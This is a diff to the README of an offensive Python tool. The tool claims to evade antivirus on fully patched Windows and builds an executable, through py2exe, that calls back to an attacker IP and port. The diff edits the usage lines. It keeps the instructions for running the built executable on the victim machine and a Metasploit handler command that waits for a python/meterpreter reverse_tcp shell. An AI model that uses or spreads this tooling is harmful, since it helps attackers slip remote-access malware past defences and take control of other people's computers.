@@ -16,7 +16,7 @@ Simple python script to evade antiviruses on fully patched and updated Windows e
 
 ## Usage:
 ```
-python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443
+python aepy2exe.py -ip 192.168.1.10 -p 443
 ```
 
 ```
@@ -34,15 +34,12 @@ Antivirus Evasion Py2exe
 
 optional arguments:
   -h, --help            show this help message and exit
-  -e EXECUTE, --execute EXECUTE
-                        execute py2exe
   -ip ATTACKER_IP, --attacker_ip ATTACKER_IP
                         specified attacker IP
   -p PORT, --port PORT  specified attcaker port
 
 Example:
         C:\>python aepy2exe.py -e py2exe -ip <ip_address> -p <port>
-        C:\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443 
 ```
 ``
 The script will generate CyberY.py, build, and dist, Our execution file will be under dist.
@@ -57,8 +54,7 @@ C:\>.\dist\CyberY.exe
 ```
 #### On attacker machine (Kali)
 ```
-┌──(kali㉿kali)-[~]
-└─$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LPORT 443; set LHOST 192.168.1.10"
+sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LPORT 443; set LHOST 192.168.1.10"
 
 msf6 exploit(multi/handler) > exploit
 ```
